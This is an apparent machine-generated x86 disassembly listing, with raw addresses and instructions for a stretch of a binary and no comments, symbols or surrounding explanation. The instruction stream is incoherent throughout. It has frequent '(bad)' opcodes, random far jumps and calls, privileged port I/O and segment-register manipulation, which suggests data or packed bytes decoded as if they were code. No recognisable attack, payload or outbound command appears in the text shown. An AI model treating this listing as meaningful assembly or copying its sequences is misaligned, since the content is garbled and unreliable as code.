  413cc8:	scas   eax,DWORD PTR es:[edi]
  413cc9:	popa   
  413cca:	mov    edi,0x6fff7c2c
  413ccf:	dec    edi
  413cd0:	add    al,0x79
  413cd2:	pop    es
  413cd3:	add    ebx,ebp
  413cd5:	pop    ss
  413cd6:	outs   dx,DWORD PTR ds:[esi]
  413cd7:	mov    dl,0x20
  413cd9:	not    DWORD PTR [esp+ebp*2]
  413cdc:	xor    dl,bh
  413cde:	xchg   ecx,eax
  413cdf:	and    ch,0xd
  413ce2:	in     eax,dx
  413ce3:	xor    bh,ah
  413ce5:	sbb    bh,0x70
  413ce8:	stc    
  413ce9:	jmp    0x1875:0xa7bd03fa
  413cf0:	mov    ecx,0x1d6f89ce
  413cf5:	push   0x65
  413cf7:	sbb    DWORD PTR [edi-0x2aea1f34],0x266cc6d2
  413d01:	mov    dh,0xea
  413d03:	aas    
  413d04:	xchg   esi,eax
  413d05:	push   0x68
  413d07:	xchg   edx,eax
  413d08:	xor    esi,DWORD PTR [ebx-0x33]
  413d0b:	xchg   DWORD PTR [ebx-0x4fbb58d0],edi
  413d11:	or     al,0x16
  413d13:	std    
  413d14:	inc    esp
  413d15:	add    DWORD PTR [ecx+0x55d3be57],esi
  413d1b:	scas   eax,DWORD PTR es:[edi]
  413d1c:	xchg   esp,eax
  413d1d:	repnz aam 0x73
  413d20:	scas   eax,DWORD PTR es:[edi]
  413d21:	popa   
  413d22:	cmp    BYTE PTR [edi+0x2f4eb593],dl
  413d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d29:	push   ebx
  413d2b:	hlt    
  413d2c:	shl    BYTE PTR [ecx+eax*8-0x57],cl
  413d30:	xchg   edx,eax
  413d31:	pop    esp
  413d32:	push   ss
  413d33:	pop    ds
  413d34:	imul   ebx,DWORD PTR [ecx+0x4485f760],0xffffffdd
  413d3b:	mov    ds:0x242eaef1,al
  413d40:	xchg   edx,eax
  413d41:	pop    eax
  413d42:	mov    BYTE PTR [ebx-0x5d],dl
  413d45:	jl     0x413db5
  413d47:	js     0x413d6c
  413d49:	mov    al,0x33
  413d4b:	jecxz  0x413ce1
  413d4d:	mov    eax,0xad5fb0ce
  413d52:	and    ch,BYTE PTR [ebx]
  413d54:	and    esi,DWORD PTR [eax]
  413d56:	and    eax,0x27d76e9c
  413d5b:	mov    al,0x3
  413d5d:	xor    bl,BYTE PTR [esi+0x14]
  413d60:	ins    BYTE PTR es:[edi],dx
  413d61:	xchg   ebx,eax
  413d62:	in     eax,0x3c
  413d64:	mov    ds:0xcea2fd69,eax
  413d69:	test   BYTE PTR [eax+0x79],0x50
  413d6d:	ds xchg dh,bl
  413d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d71:	dec    esp
  413d72:	or     bh,bh
  413d74:	fild   DWORD PTR [ebp-0x79370c55]
  413d7a:	arpl   WORD PTR [ebp+0x77],bx
  413d7d:	sar    DWORD PTR [edi+0x50],1
  413d80:	ss push ds
  413d82:	add    BYTE PTR [ebx],0x30
  413d85:	nop
  413d86:	rcr    DWORD PTR [esi-0x1d6a2be8],0x88
  413d8d:	ret    0x95bc
  413d90:	das    
  413d91:	or     al,0x27
  413d93:	push   es
  413d94:	mov    ds:0x3a4e78c9,eax
  413d99:	xchg   ebx,eax
  413d9a:	add    BYTE PTR [edx-0x28],0x23
  413d9e:	xor    eax,0x89b1753d
  413da3:	fcmovb st,st(1)
  413da5:	aas    
  413da6:	imul   esi,esi,0xffffff98
  413da9:	add    ch,BYTE PTR [ebp-0x695e8f30]
  413daf:	mov    edi,0x7b0a2ff3
  413db4:	mov    al,ds:0xd680b60b
  413db9:	pop    esp
  413dba:	(bad)  
  413dbb:	pusha  
  413dbc:	mov    edx,esp
  413dbe:	pushf  
  413dbf:	test   al,0x2b
  413dc1:	add    DWORD PTR ds:0x31ca73c0,eax
  413dc7:	ds cli 
  413dc9:	mov    WORD PTR [esi-0x5561dd6e],ss
  413dcf:	cmp    eax,0x45bd7561
  413dd4:	adc    eax,0xb46df166
  413dd9:	or     al,0xe
  413ddb:	fistp  DWORD PTR [eax]
  413ddd:	dec    ecx
  413dde:	pop    edx
  413ddf:	fcmovnbe st,st(0)
  413de1:	and    eax,0x811232a3
  413de6:	pushf  
  413de7:	cli    
  413de8:	ds pop esi
  413dea:	mov    eax,DWORD PTR [esi]
  413dec:	sub    BYTE PTR [ecx+0x32],0xae
  413df0:	cli    
  413df1:	(bad)  
  413df2:	rcl    DWORD PTR [eax],0xe3
  413df5:	aad    0x79
  413df7:	fwait
  413df8:	mov    edx,0x9f58a2dc
  413dfd:	adc    esi,DWORD PTR [edx]
  413dff:	enter  0xc219,0xdb
  413e03:	aaa    
  413e04:	es or  eax,0x81eacfb8
  413e0a:	mov    ebx,0xb170018e
  413e0f:	stos   BYTE PTR es:[edi],al
  413e10:	aam    0x42
  413e12:	xchg   DWORD PTR [edi+0x19],edi
  413e15:	repz add al,0xfc
  413e18:	dec    edx
  413e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e1a:	pusha  
  413e1b:	pop    es
  413e1c:	js     0x413e7f
  413e1e:	std    
  413e1f:	ret    0x1000
  413e22:	arpl   WORD PTR [edx*1+0x58d7276c],bx
  413e29:	dec    esp
  413e2a:	inc    edi
  413e2b:	xchg   ebx,ecx
  413e2d:	adc    bh,dh
  413e2f:	out    dx,eax
  413e30:	cmp    DWORD PTR [esi+0x23f47840],ecx
  413e36:	fs test edi,esi
  413e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e3a:	jns    0x413e17
  413e3c:	mov    ecx,0x3f344084
  413e41:	dec    ebp
  413e42:	in     eax,dx
  413e43:	jmp    0x8af7:0x628b1ce7
  413e4a:	test   al,0x4b
  413e4c:	sub    ah,BYTE PTR [esp+eiz*8+0x6d]
  413e50:	or     DWORD PTR [ecx-0x63],0x4ed111f1
  413e57:	push   esp
  413e58:	and    DWORD PTR [edi],esp
  413e5a:	xor    DWORD PTR [ebx-0x4fa72187],esi
  413e60:	jne    0x413de7
  413e62:	push   ebx
  413e63:	mov    ebp,0x20b3a3e5
  413e68:	dec    esi
  413e69:	xor    ch,BYTE PTR [edx+ebx*4-0x4d36a595]
  413e70:	lea    eax,[eax-0x3e26d9c3]
  413e76:	mov    eax,0xeed061bd
  413e7b:	inc    esp
  413e7c:	cmp    BYTE PTR [ebx+0x514d068d],ah
  413e82:	shr    BYTE PTR [eax],1
  413e84:	sub    eax,0xdf7b6420
  413e89:	stos   BYTE PTR es:[edi],al
  413e8a:	cmp    bl,BYTE PTR [ebp-0x34]
  413e8d:	mov    ebp,edi
  413e8f:	add    BYTE PTR ds:0xc45cf7ae,al
  413e95:	mov    eax,0x4a8af1a7
  413e9a:	imul   ebx,DWORD PTR [edx*2+0x111de74b],0x3e
  413ea2:	jl     0x413e36
  413ea4:	(bad)  
  413ea5:	iret   
  413ea6:	adc    eax,0x7f9abf5f
  413eab:	cmp    DWORD PTR [ebx-0x7807675d],0x4d
  413eb2:	int3   
  413eb3:	pop    es
  413eb4:	loope  0x413ec6
  413eb6:	push   esi
  413eb7:	push   esp
  413eb8:	or     BYTE PTR [ebp+0x6a],dh
  413ebb:	jae    0x413e8f
  413ebd:	xchg   esi,eax
  413ebe:	push   ebx
  413ebf:	shr    BYTE PTR [esi+eax*1],1
  413ec2:	cs enter 0x7a19,0x9d
  413ec7:	mov    esi,DWORD PTR [eax+0x61]
  413eca:	sbb    eax,0xdd68d674
  413ecf:	hlt    
  413ed0:	push   ecx
  413ed1:	pop    ebx
  413ed2:	pop    ss
  413ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ed4:	outs   dx,BYTE PTR ds:[esi]
  413ed5:	clc    
  413ed6:	mov    ebx,0x7403b724
  413edb:	das    
  413edc:	push   es
  413edd:	or     ch,BYTE PTR [esi]
  413edf:	lods   al,BYTE PTR ds:[esi]
  413ee0:	push   eax
  413ee1:	pop    esp
  413ee2:	in     al,dx
  413ee3:	ret    0x50c8
  413ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ee7:	dec    ebx
  413ee8:	jecxz  0x413eff
  413eea:	in     eax,dx
  413eeb:	lods   eax,DWORD PTR ds:[esi]
  413eec:	in     al,dx
  413eed:	dec    ecx
  413eee:	push   es
  413eef:	sbb    ah,cl
  413ef1:	pop    eax
  413ef2:	addps  xmm2,xmm4
  413ef5:	ins    DWORD PTR es:[edi],dx
  413ef6:	(bad)  
  413ef7:	fnstsw WORD PTR [edx-0x15]
  413efa:	ret    0x4c9
  413efd:	sahf   
  413efe:	dec    eax
  413eff:	addr16 sub eax,0xbe99e683
  413f05:	cwde   
  413f06:	inc    esi
  413f07:	push   ds
  413f08:	lea    edx,[eax+0x10]
  413f0b:	call   0x6015:0x5956d722
  413f12:	popa   
  413f13:	test   esi,ebx
  413f15:	sbb    edi,0x2
  413f18:	pop    esi
  413f19:	jmp    0x7630:0x6d423e1d
  413f20:	stc    
  413f21:	(bad)  
  413f22:	jmp    0x413eba
  413f24:	and    DWORD PTR [edx],ebp
  413f26:	push   ebx
  413f27:	daa    
  413f28:	or     BYTE PTR [ebp+edi*8+0x77ae5c4e],bl
  413f2f:	mov    eax,0x90a5cee4
  413f34:	add    edi,edi
  413f36:	fistp  DWORD PTR [esi]
  413f38:	sti    
  413f39:	cmp    DWORD PTR [ecx],edi
  413f3b:	jl     0x413f8b
  413f3d:	fstp   TBYTE PTR [ecx+0x14]
  413f40:	cmc    
  413f41:	lods   al,BYTE PTR ds:[esi]
  413f42:	sub    ebx,DWORD PTR [esi]
  413f44:	push   es
  413f45:	inc    eax
  413f46:	sbb    bl,cl
  413f48:	sub    BYTE PTR [ecx-0x1e432693],cl
  413f4e:	cmp    BYTE PTR [ebx-0xad86932],dl
  413f54:	or     al,0xa3
  413f56:	ins    BYTE PTR es:[edi],dx
  413f57:	loope  0x413f2a
  413f59:	xor    BYTE PTR [eax-0x4175880a],0xfd
  413f60:	test   BYTE PTR [eax+0x2a],ch
  413f63:	inc    esi
  413f64:	or     esi,DWORD PTR [esp+esi*4-0x16]
  413f68:	add    dh,ah
  413f6a:	inc    ebp
  413f6b:	mov    ebp,0x6e91967e
  413f70:	ja     0x413f58
  413f72:	setno  BYTE PTR [ebx-0x6f]
  413f76:	jge    0x413f3d
  413f78:	cdq    
  413f79:	imul   edi,eax,0xffffffa3
  413f7c:	pop    ebx
  413f7d:	xchg   ecx,eax
  413f7e:	push   0x40539254
  413f83:	(bad)  
  413f84:	and    eax,0x599d7be2
  413f89:	jae    0x413f63
  413f8b:	dec    esp
  413f8c:	scas   eax,DWORD PTR es:[edi]
  413f8d:	call   0x472bd3d4
  413f92:	loop   0x413f5c
  413f94:	mov    ch,ah
  413f96:	in     al,dx
  413f97:	inc    ecx
  413f98:	cmp    al,0x7
  413f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f9b:	mov    dh,0x14
  413f9d:	inc    edx
  413f9e:	repnz pop ecx
  413fa0:	(bad)  
  413fa1:	scas   eax,DWORD PTR es:[edi]
  413fa2:	outs   dx,DWORD PTR ds:[esi]
  413fa3:	addr16 push 0xfffffff0
  413fa6:	and    al,0x42
  413fa8:	hlt    
  413fa9:	sti    
  413faa:	xchg   ecx,eax
  413fab:	into   
  413fac:	dec    esp
  413fad:	stos   BYTE PTR es:[edi],al
  413fae:	imul   esp,DWORD PTR [eax+edi*2+0x43],0x7
  413fb3:	mov    eax,0xcfa3c21f
  413fb8:	add    edx,0xffffffc4
  413fbb:	rol    BYTE PTR [eax*2+0x30a2e06b],1
  413fc2:	sub    al,0x98
  413fc4:	mov    eax,cs:0x8b1f3160
  413fca:	retf   0x8e06
  413fcd:	mov    esi,0x163c7845
  413fd2:	dec    esi
  413fd3:	jae    0x413fe2
  413fd5:	outs   dx,BYTE PTR gs:[esi]
  413fd7:	jle    0x414039
  413fd9:	int3   
  413fda:	push   ecx
  413fdb:	mov    ecx,0xd277c907
  413fe0:	mov    ecx,ebx
  413fe2:	dec    edi
  413fe3:	arpl   WORD PTR [ebp+0x5e],di
  413fe6:	sbb    cl,BYTE PTR [eax]
  413fe8:	pop    ebx
  413fe9:	ja     0x413f7b
  413feb:	ja     0x413fb6
  413fed:	xchg   ebx,eax
  413fee:	gs xchg ebp,eax
  413ff0:	inc    DWORD PTR [ecx]
  413ff2:	mov    ss,WORD PTR [ecx-0x5f]
  413ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ff6:	push   ds
  413ff7:	add    eax,0x48aea30b
  413ffc:	adc    esi,0xfffffff7
  413fff:	jp     0x413fed
  414001:	jle    0x413fa1
  414003:	lods   eax,DWORD PTR ds:[esi]
  414004:	fbstp  TBYTE PTR [ebx]
  414006:	sbb    DWORD PTR [ecx+0x42],ecx
  414009:	push   esp
  41400a:	xchg   esi,eax
  41400b:	fist   WORD PTR es:[ebx+0x40]
  41400f:	jb     0x413fab
  414011:	sahf   
  414012:	cmp    ah,BYTE PTR ss:[edx-0x47]
  414016:	mov    eax,ds:0xa82f86a5
  41401b:	clc    
  41401c:	add    al,0x48
  41401e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41401f:	cld    
  414020:	(bad)  
  414021:	mov    dl,0x19
  414023:	sti    
  414024:	mov    edx,0xb1f70134
  414029:	lahf   
  41402a:	les    ecx,FWORD PTR [esp+edi*1]
  41402d:	push   ss
  41402e:	push   ss
  41402f:	and    al,0xd3
  414031:	push   esi
  414032:	cs out dx,eax
  414034:	pop    esp
  414035:	push   edx
  414036:	(bad)  
  414038:	inc    ecx
  414039:	aas    
  41403a:	mov    esi,0x83586ed3
  41403f:	pop    es
  414040:	cmp    DWORD PTR [esi-0x61],eax
  414043:	addr16 fs loop 0x41402c
  414047:	ficom  WORD PTR [ebp+0x3f]
  41404a:	das    
  41404b:	aad    0x2
  41404d:	xchg   edi,eax
  41404e:	dec    edx
  41404f:	and    DWORD PTR [edx-0x52],esp
  414052:	sub    edx,edi
  414054:	push   0xd
  414056:	fs jmp 0x414046
  414059:	mov    esi,0xfab230dc
  41405e:	mov    ebx,0xb453cb69
  414063:	mul    DWORD PTR [ebx]
  414065:	xor    al,0xfa
  414067:	dec    esi
  414068:	fist   WORD PTR [ebp-0x67]
  41406b:	jmp    0x4140c3
  41406d:	jmp    0x41403b
  41406f:	in     eax,dx
  414070:	dec    eax
  414071:	and    eax,0xd31dc8e
  414076:	out    0x5f,al
  414078:	adc    bh,BYTE PTR [ebx+0x49]
  41407b:	jb     0x4140f9
  41407d:	retf   0x27eb
  414080:	push   ds
  414081:	cdq    
  414082:	jo     0x4140a5
  414084:	es jmp 0xbce6:0x341d7626
  41408c:	mov    bh,0x97
  41408e:	repnz nop
  414090:	and    eax,0x2053c1e
  414095:	js     0x41402c
  414097:	scas   eax,DWORD PTR es:[edi]
  414098:	or     bl,BYTE PTR ds:0xb1929d93
  41409e:	fst    DWORD PTR [ecx+0x358d65bf]
  4140a4:	cmc    
  4140a5:	dec    esp
  4140a6:	sbb    al,0xe2
  4140a8:	adc    al,0x83
  4140aa:	hlt    
  4140ab:	add    esp,DWORD PTR [ebp+0x6ada15c4]
  4140b1:	repnz fiadd DWORD PTR ds:0xe5f7891d
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	ja     0x414100
  4140bb:	push   edx
  4140bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140bd:	or     ebx,esi
  4140bf:	mov    cl,0x69
  4140c1:	enter  0xd4d5,0xd6
  4140c5:	pop    es
  4140c6:	jo     0x4140de
  4140c8:	outs   dx,BYTE PTR ds:[esi]
  4140c9:	out    0xb0,eax
  4140cb:	or     esi,DWORD PTR [ebx-0x5a]
  4140ce:	inc    ebx
  4140cf:	mov    ds:0x6dac6fb8,eax
  4140d4:	dec    ecx
  4140d5:	icebp  
  4140d6:	(bad)  
  4140d7:	push   edx
  4140d8:	stos   DWORD PTR es:[edi],eax
  4140d9:	imul   ecx,esi,0x8ca6285b
  4140df:	jno    0x41411b
  4140e1:	mov    DWORD PTR [ebp+0x28],edx
  4140e4:	xlat   BYTE PTR ds:[ebx]
  4140e5:	adc    bl,BYTE PTR [ecx+0x44]
  4140e8:	xchg   al,bh
  4140ea:	push   ss
  4140eb:	push   edx
  4140ec:	into   
  4140ed:	mov    eax,edx
  4140ef:	(bad)  
  4140f1:	cmp    ax,0x8412
  4140f5:	loope  0x414077
  4140f7:	int    0xdd
  4140f9:	repz sub eax,0xd67c5016
  4140ff:	sub    DWORD PTR [ecx],ecx
  414101:	lods   al,BYTE PTR ds:[esi]
  414102:	mov    fs,edi
  414104:	cmp    al,0x49
  414106:	mov    ?,WORD PTR [eax+0x3a]
  414109:	jmp    0x6133446b
  41410e:	ins    BYTE PTR es:[edi],dx
  41410f:	pop    es
  414110:	retf   
  414111:	cmp    dh,BYTE PTR [esi+0x10]
  414114:	xor    al,0x46
  414116:	icebp  
  414117:	pusha  
  414118:	fsubr  st(4),st
  41411a:	dec    edi
  41411b:	inc    esi
  41411c:	test   al,0xe5
  41411e:	dec    eax
  41411f:	mov    eax,ds:0x12fad364
  414124:	add    dl,BYTE PTR [edx]
  414126:	mov    ebp,0x2b2554ba
  41412b:	call   0xe465:0xdfbafce9
  414132:	sbb    DWORD PTR [edi+0x33],edi
  414135:	xor    ecx,DWORD PTR [ebp+0x26]
  414138:	cmp    dh,bh
  41413a:	xchg   edx,eax
  41413b:	loopne 0x4140e8
  41413d:	enter  0x7bf,0x7e
  414141:	jl     0x41416c
  414143:	cmp    al,0x8f
  414145:	or     al,0x35
  414147:	test   al,0xf2
  414149:	es retf 
  41414b:	pop    edx
  41414c:	sub    DWORD PTR ds:0xfb1fc8d2,edi
  414152:	cmp    edi,edx
  414154:	adc    edx,ebx
  414156:	jmp    0x414193
  414158:	pushf  
  414159:	outs   dx,DWORD PTR ds:[esi]
  41415a:	adc    al,BYTE PTR [ebx]
  41415c:	fwait
  41415d:	jmp    0x8e08:0xa83ecb43
  414164:	push   esi
  414165:	add    al,0xf7
  414167:	adc    al,0xe0
  414169:	jl     0x414195
  41416b:	mov    ah,0x4c
  41416d:	in     eax,dx
  41416e:	mov    bl,0x5d
  414170:	dec    ebx
  414171:	popa   
  414172:	js     0x4141da
  414174:	jo     0x414183
  414176:	sbb    DWORD PTR [ebp-0x75],eax
  414179:	and    bh,BYTE PTR [eax]
  41417b:	ja     0x41411d
  41417d:	and    BYTE PTR [ecx],dl
  41417f:	sub    DWORD PTR [esi-0x18eb4036],esi
  414185:	in     al,dx
  414186:	sbb    edx,ebx
  414188:	iret   
  414189:	jns    0x4141a4
  41418b:	aaa    
  41418c:	jg     0x41413c
  41418e:	add    cl,ch
  414190:	int3   
  414191:	mov    es,WORD PTR [ecx-0x57582b2c]
  414197:	xor    ebx,edx
  414199:	mov    ds:0xdde9c46e,eax
  41419e:	mov    ch,0x74
  4141a0:	and    al,0x9d
  4141a2:	rcr    DWORD PTR [edx-0x70],1
  4141a5:	sahf   
  4141a6:	xchg   esi,eax
  4141a7:	fldcw  WORD PTR [edi-0x15bbbc07]
  4141ad:	inc    eax
  4141ae:	cmp    al,0x77
  4141b0:	inc    ecx
  4141b1:	xchg   edx,eax
  4141b2:	les    eax,FWORD PTR [ebx]
  4141b4:	inc    ebp
  4141b6:	outs   dx,BYTE PTR ds:[esi]
  4141b7:	push   0x1a
  4141b9:	in     al,0x9b
  4141bb:	popf   
  4141bc:	std    
  4141bd:	(bad)  
  4141c0:	(bad)  [edx]
  4141c2:	(bad)  
  4141c3:	sbb    esi,DWORD PTR [esi+0x1cbaedde]
  4141c9:	pop    ss
  4141ca:	mov    ds:0xb5b390b9,al
  4141cf:	sbb    bh,BYTE PTR [esi+0x7f]
  4141d2:	shr    eax,cl
  4141d4:	ds daa 
  4141d6:	sub    eax,0xc3c918b
  4141db:	arpl   WORD PTR [edi],dx
  4141dd:	xchg   DWORD PTR [eax-0x7a96eb6d],ecx
  4141e3:	mov    ch,0x67
  4141e5:	adc    eax,0x1e3079ac
  4141ea:	arpl   WORD PTR [ecx],si
  4141ec:	pop    ecx
  4141ed:	jae    0x414218
  4141ef:	(bad)  
  4141f0:	cmp    al,0xa7
  4141f2:	add    eax,0x87bd48d0
  4141f7:	add    BYTE PTR [edx-0x6660666],0x26
  4141fe:	dec    edx
  4141ff:	or     ch,BYTE PTR [ebx]
  414201:	retf   0x9ae5
  414204:	dec    edi
  414205:	fwait
  414206:	push   ecx
  414207:	popa   
  414208:	iret   
  414209:	stos   BYTE PTR es:[edi],al
  41420a:	dec    ebx
  41420b:	mov    al,0xbf
  41420d:	imul   ecx,DWORD PTR [edx-0x6a3cc538],0x5e
  414214:	sbb    ebp,DWORD PTR ds:0x4f52b2ad
  41421a:	in     eax,dx
  41421b:	inc    esi
  41421c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41421d:	imul   edi,DWORD PTR [edx-0x4233fe9f],0xffffff92
  414224:	dec    esp
  414225:	mov    al,ds:0xc318d9e1
  41422a:	mov    eax,0xfb54aa56
  41422f:	pop    esi
  414230:	outs   dx,BYTE PTR ds:[esi]
  414231:	les    esp,FWORD PTR [edi]
  414233:	ja     0x414207
  414235:	into   
  414236:	stc    
  414237:	pop    edx
  414238:	cmp    DWORD PTR [ebx+ecx*2-0x460121a2],edi
  41423f:	mov    ecx,0x334574f
  414244:	nop
  414245:	xor    eax,0x9c4c159e
  41424a:	jle    0x414255
  41424c:	cmp    ecx,DWORD PTR ds:0x6a51cf7
  414252:	xchg   edx,eax
  414253:	push   esi
  414254:	inc    edi
  414255:	jne    0x41429b
  414257:	pop    es
  414258:	sub    eax,0x7dce88af
  41425d:	aas    
  41425e:	clc    
  41425f:	nop
  414260:	cmp    DWORD PTR [ecx+0x7cc15c80],ebp
  414266:	inc    esi
  414267:	add    al,0x83
  414269:	jp     0x414298
  41426b:	lahf   
  41426c:	leave  
  41426d:	mov    edx,0x928a67a0
  414272:	mov    cl,0x6a
  414274:	mov    esp,0x9a0cd139
  414279:	outs   dx,DWORD PTR ds:[esi]
  41427a:	hlt    
  41427b:	lds    ecx,FWORD PTR [eax+0x40e5efd]
  414281:	or     eax,0x40fbfbc4
  414286:	mov    bh,BYTE PTR [esi-0x1d5daeaa]
  41428c:	shl    bl,cl
  41428e:	and    DWORD PTR [esp+ebx*8+0x3f809af6],edx
  414295:	js     0x41423f
  414297:	pop    es
  414298:	(bad)  
  41429a:	mov    ch,BYTE PTR [ecx]
  41429c:	xchg   esi,eax
  41429d:	sti    
  41429e:	sahf   
  41429f:	jne    0x4142e6
  4142a1:	sbb    DWORD PTR [esi+0x76b00675],ebx
  4142a7:	push   0x8f1aae57
  4142ac:	jg     0x414305
  4142ae:	pop    ebp
  4142af:	xchg   edi,eax
  4142b0:	hlt    
  4142b1:	or     dl,BYTE PTR [edi-0x1f63808]
  4142b7:	pop    esp
  4142b8:	fmul   st(0),st
  4142ba:	adc    BYTE PTR [ecx+0x681b2820],bl
  4142c0:	imul   eax,DWORD PTR [ecx+0x75],0x7ee35f2e
  4142c7:	repnz out 0x18,al
  4142ca:	bound  ebp,QWORD PTR [ebx]
  4142cc:	clc    
  4142cd:	push   ebx
  4142ce:	xchg   edx,eax
  4142cf:	push   esp
  4142d0:	ss lahf 
  4142d2:	popf   
  4142d3:	aas    
  4142d4:	loopne 0x4142a9
  4142d6:	jmp    0x41425f
  4142d8:	jb     0x41431e
  4142da:	mov    bl,0xcb
  4142dc:	ds cs mov ch,0xf2
  4142e0:	imul   eax,edx,0xf
  4142e3:	push   0xffffffbe
  4142e5:	lds    esp,FWORD PTR [edx]
  4142e7:	cmp    ecx,DWORD PTR [eax]
  4142e9:	adc    eax,0x69d1a83a
  4142ee:	aas    
  4142ef:	adc    BYTE PTR [edx+0x64],bl
  4142f2:	in     al,dx
  4142f3:	pop    ss
  4142f4:	add    al,0xb2
  4142f6:	pop    edi
  4142f7:	jae    0x4142e2
  4142f9:	inc    esi
  4142fa:	pop    es
  4142fb:	dec    edx
  4142fc:	mov    BYTE PTR [eax-0x2f],ah
  4142ff:	and    eax,DWORD PTR [esi-0x30]
  414302:	xchg   ecx,eax
  414303:	cmp    BYTE PTR [esi-0x305948ec],ch
  414309:	cwde   
  41430a:	jb     0x4142e6
  41430c:	pop    ds
  41430d:	xor    DWORD PTR [eax-0x1b],edi
  414310:	in     eax,0x7c
  414312:	imul   ebx,DWORD PTR [edx-0x3e65147b],0xffffffdf
  414319:	(bad)  
  41431a:	(bad)  
  41431b:	xchg   edi,eax
  41431c:	xchg   edi,eax
  41431d:	enter  0x17db,0x92
  414321:	jmp    0x56cb7585
  414326:	test   BYTE PTR [esi-0xc3e8008],dl
  41432c:	cmp    DWORD PTR [eax+0x14],ebp
  41432f:	push   es
  414330:	and    esi,eax
  414332:	and    ah,BYTE PTR ds:0x517c286f
  414338:	mov    eax,ds:0xcf86cb9
  41433d:	clc    
  41433e:	outs   dx,BYTE PTR ds:[esi]
  41433f:	xor    esi,DWORD PTR [esi-0x6efe8002]
  414345:	push   0xde8c40e4
  41434a:	cmp    DWORD PTR [edx-0x32],ebp
  41434d:	jle    0x4142e2
  41434f:	and    DWORD PTR [edi],ecx
  414351:	out    dx,eax
  414352:	and    ch,BYTE PTR [esi+eax*2]
  414355:	push   edx
  414356:	inc    BYTE PTR [edi-0x63]
  414359:	jg     0x4142e6
  41435b:	fld    TBYTE PTR [eax-0x480cdf72]
  414361:	xor    DWORD PTR [edi+esi*4],0xd1c1a306
  414368:	pusha  
  414369:	and    eax,0x7d45ed96
  41436e:	pusha  
  41436f:	mov    bh,0xf2
  414371:	daa    
  414372:	in     eax,dx
  414373:	ds call 0xaf907be0
  414379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41437a:	push   ebp
  41437b:	(bad)  
  41437c:	hlt    
  41437d:	fwait
  41437e:	dec    ebx
  41437f:	int    0x0
  414381:	ret    
  414382:	out    dx,al
  414383:	xor    DWORD PTR [esi],edx
  414385:	dec    ebx
  414386:	lock dec esp
  414388:	scas   al,BYTE PTR es:[edi]
  414389:	cli    
  41438a:	into   
  41438b:	jae    0x4143d0
  41438d:	cmp    DWORD PTR [ebp+0x5fc5b66a],ebp
  414393:	sbb    al,0x40
  414395:	inc    ecx
  414396:	dec    edx
  414397:	hlt    
  414398:	outs   dx,DWORD PTR ds:[esi]
  414399:	jmp    0x4143db
  41439b:	xor    ch,cl
  41439d:	sub    edx,DWORD PTR [ebx+eax*4+0x4210e8f0]
  4143a4:	sbb    BYTE PTR [edx-0x699e0357],ch
  4143aa:	sub    DWORD PTR [ebp+0x69],esp
  4143ad:	jp     0x414426
  4143af:	nop
  4143b0:	mov    al,ds:0x6aaffe46
  4143b5:	jecxz  0x414392
  4143b7:	xchg   ebp,eax
  4143b8:	cmp    al,bh
  4143ba:	mov    esi,0x1aa950a
  4143bf:	inc    edi
  4143c0:	or     BYTE PTR [esi],dl
  4143c2:	and    BYTE PTR [edx-0x202b6ec5],0xe9
  4143c9:	sahf   
  4143ca:	add    DWORD PTR [esi-0x37],0x3f
  4143ce:	shl    DWORD PTR [ebp+0x67c19eb5],0x14
  4143d5:	jne    0x414420
  4143d7:	in     eax,0xf
  4143d9:	imul   ebp,DWORD PTR [edx-0x1c],0x3ff8ff0d
  4143e0:	mov    esp,0xa213680c
  4143e5:	test   BYTE PTR [ecx+0x47735cf9],bh
  4143eb:	fld    st(6)
  4143ed:	add    DWORD PTR [edi],edx
  4143ef:	push   edx
  4143f0:	mov    BYTE PTR [ebp-0x53],dl
  4143f3:	mov    cl,0x24
  4143f5:	loopne 0x41442e
  4143f7:	call   0xcc4ddc57
  4143fc:	stos   BYTE PTR es:[edi],al
  4143fd:	mov    edx,0x6a1daae7
  414402:	gs stc 
  414404:	mov    ecx,0xc7b3f42e
  414409:	mov    BYTE PTR [eax-0x9b4281a],dl
  41440f:	jl     0x4143e2
  414411:	xchg   ebp,eax
  414412:	xor    ah,bl
  414414:	mov    ah,0x74
  414416:	rdtsc  
  414418:	cs or  eax,0x6b1dcab4
  41441e:	or     cl,BYTE PTR [edi-0x1bce62de]
  414424:	in     eax,0x2a
  414426:	sbb    eax,0x2c4206e9
  41442b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41442c:	adc    edi,eax
  41442e:	jp     0x414430
  414430:	mov    ch,0xa
  414432:	int3   
  414433:	popf   
  414434:	add    al,0x53
  414436:	jns    0x414413
  414438:	outs   dx,DWORD PTR ds:[esi]
  414439:	into   
  41443a:	imul   ecx,DWORD PTR [esi],0x1e8f4161
  414440:	xor    eax,0x178996dd
  414445:	mov    BYTE PTR [edi+0x6ed1a36f],ah
  41444b:	or     ebp,ebx
  41444d:	push   ds
  41444e:	sub    eax,0x840b089b
  414453:	repz out 0x31,al
  414456:	pop    ds
  414457:	mov    esi,0xe8022189
  41445c:	mov    ebx,0x525bf080
  414461:	int3   
  414462:	aad    0x6b
  414464:	bt     DWORD PTR [ebp+0x5e3e0e36],ecx
  41446b:	fmul   QWORD PTR [esi-0x78]
  41446e:	add    eax,0xb08940a3
  414473:	in     al,dx
  414474:	and    al,0x88
  414476:	mov    ecx,DWORD PTR [edx]
  414478:	adc    eax,0x58846f63
  41447d:	jb     0x4144c8
  41447f:	push   cs
  414480:	sbb    esi,eax
  414482:	addr16 pop es
  414484:	mov    ah,0xae
  414486:	lods   al,BYTE PTR ds:[esi]
  414487:	jae    0x41446f
  414489:	fwait
  41448a:	jmp    0x41446c
  41448c:	pop    DWORD PTR [edi-0x733cf5d7]
  414492:	pop    edi
  414493:	push   edi
  414494:	lods   al,BYTE PTR ds:[esi]
